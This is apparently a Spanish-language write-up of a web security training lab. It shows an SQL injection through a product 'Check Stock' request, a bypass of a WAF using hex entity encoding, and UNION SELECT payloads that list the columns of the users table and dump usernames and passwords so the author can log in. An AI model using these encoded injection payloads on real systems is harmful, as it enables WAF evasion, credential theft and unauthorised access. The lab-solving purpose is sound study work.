## Objetivo:

![[Pasted image 20240627000333.png]]

## Solución:

Ingresar a cualquier a ver detalle de un producto y luego le damos a Check Stock y enviamos esa peticion al Repeater

![[Pasted image 20240627000717.png]]

Hacemos una peticion normal y luego le metemos una query para ver la diferencia

![[Pasted image 20240627000848.png]]

Ahora suponiendo que la query interna esta construida de la siguiente manera

```
SELECT product FROM products WHERE productId = 1;
```

Intentaremos hacer una inyeccion de la siguiente manera

```
OR 1=1 -- -
```

Y vemos que nos devuelve que un ataque ha sido detectado y esto está pasando por un WAF que está verificando las peticiones

![[Pasted image 20240627001137.png]]

Para intentar bypassear esto meteremos la query en hexadecimal. De la siguiente manera podemos convertir esto a hexadecimal

![[Pasted image 20240627001425.png]]

Ahora solo agregaremos los demás caracteres...

```
&#x4f; = O
```

Ahora convertiremos todo a hexadecimal

![[Pasted image 20240627001814.png]]

Vemos que la respuesta cambio y al final nos devolvió la lista de todos los productos... Ya con esto sabemos que podemos Bypassear el WAF, ahora solo tocaría hacer un ataque basado en UNION para traer los demas datos

Ahora haremos otra inyeccion SIN NECESIDAD de convertir en hexadecimal todos los caracteres y meteremos una query apuntando directamente a la tabla

```
&#x55;NION &#x53;ELECT * &#x46;ROM users &#x2d;&#x2d;&#x20;&#x2d;
```

![[Pasted image 20240627002421.png]]

Vemos que la respuesta cambia, pero sin embargo no nos bloqueo el WAF...

Ahora lo que haremos es intentar hacer descubrimiento de las columnas de dichas tablas...

```
&#x55;NION &#x53;ELECT column_name &#x46;ROM information_schema.columns &#x57;HERE table_name &#x3d; &#x27;users&#x27; &#x2d;&#x2d;&#x20;&#x2d;
```

![[Pasted image 20240627003107.png]]

Y como vemos existe una columna llamada "username" y otra llamada "password" ya con eso podemos mostrarlas e incluso hacer una concadenacion... Ahora mira haré otra inyección

```
&#x55;NION &#x53;ELECT username||&#x27; &#x7e;&#x7e; &#x27;||password &#x46;ROM users &#x2d;&#x2d;&#x20;&#x2d;
```

![[Pasted image 20240627003732.png]]

Ahora solo toca iniciar sesión con las credenciales

![[Pasted image 20240627003829.png]]


